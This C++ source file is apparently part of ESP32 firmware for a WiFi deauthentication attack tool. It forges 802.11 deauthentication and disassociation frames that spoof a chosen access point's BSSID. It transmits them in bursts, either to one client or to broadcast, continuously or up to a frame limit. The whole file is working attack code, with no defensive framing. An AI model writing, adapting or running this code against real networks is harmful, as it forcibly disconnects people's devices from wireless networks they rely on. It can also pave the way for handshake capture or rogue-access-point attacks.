#include "deauther.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "log.h"
#include "wifi_utils.h"

static AttackConfig g_cfg;
static bool g_active = false;
static uint32_t g_last_burst = 0;
static uint16_t g_seq = 0;

static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static void send_frame(uint8_t fc0, const uint8_t *bssid, const uint8_t *dst, uint16_t reason) {
  uint8_t frame[26];
  frame[0] = fc0;
  frame[1] = 0x00;
  frame[2] = 0x00;
  frame[3] = 0x00;
  memcpy(frame + 4, dst, 6);
  memcpy(frame + 10, bssid, 6);
  memcpy(frame + 16, bssid, 6);
  frame[22] = static_cast<uint8_t>(g_seq & 0x0F);
  frame[23] = static_cast<uint8_t>((g_seq >> 4) & 0xFF);
  g_seq++;
  frame[24] = static_cast<uint8_t>(reason & 0xFF);
  frame[25] = static_cast<uint8_t>((reason >> 8) & 0xFF);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}

void deauth_begin() {
  memset(&g_cfg, 0, sizeof(g_cfg));
  g_active = false;
}

bool deauth_start(const uint8_t *bssid, const uint8_t *client, uint8_t channel, uint16_t reason,
                  bool continuous, uint32_t max_frames) {
  if (channel < 1 || channel > 14) return false;
  if (!bssid || wifi_mac_zero(bssid)) return false;

  memcpy(g_cfg.bssid, bssid, 6);
  g_cfg.has_target = true;
  if (client && !wifi_mac_zero(client)) {
    memcpy(g_cfg.client, client, 6);
    g_cfg.has_client = true;
  } else {
    g_cfg.has_client = false;
    memset(g_cfg.client, 0, 6);
  }
  g_cfg.channel = channel;
  g_cfg.reason = reason ? reason : 7;
  g_cfg.continuous = continuous;
  g_cfg.max_frames = continuous ? 0 : max_frames;
  g_cfg.started_at = millis();
  g_cfg.sent = 0;
  g_last_burst = 0;
  g_active = true;

  wifi_set_channel(channel);
  log_print("deauth start bssid=%s channel=%u reason=%u continuous=%u",
            wifi_mac_str(bssid).c_str(), channel, g_cfg.reason, continuous ? 1 : 0);
  return true;
}

void deauth_stop() {
  if (g_active) log_print("deauth stop sent=%lu", static_cast<unsigned long>(g_cfg.sent));
  g_active = false;
}

void deauth_tick() {
  if (!g_active) return;
  uint32_t now = millis();
  if (now - g_last_burst < DEAUTH_BURST_INTERVAL_MS) return;
  g_last_burst = now;

  const uint8_t *dst = g_cfg.has_client ? g_cfg.client : BROADCAST;
  for (int i = 0; i < DEAUTH_FRAMES_PER_BURST; i++) {
    if (i & 1) {
      send_frame(0xA0, g_cfg.bssid, dst, 8);  // disassoc
    } else {
      send_frame(0xC0, g_cfg.bssid, dst, g_cfg.reason);  // deauth
    }
    g_cfg.sent++;
    if (!g_cfg.continuous && g_cfg.max_frames && g_cfg.sent >= g_cfg.max_frames) {
      deauth_stop();
      return;
    }
  }
}

bool deauth_active() { return g_active; }
const AttackConfig &deauth_config() { return g_cfg; }
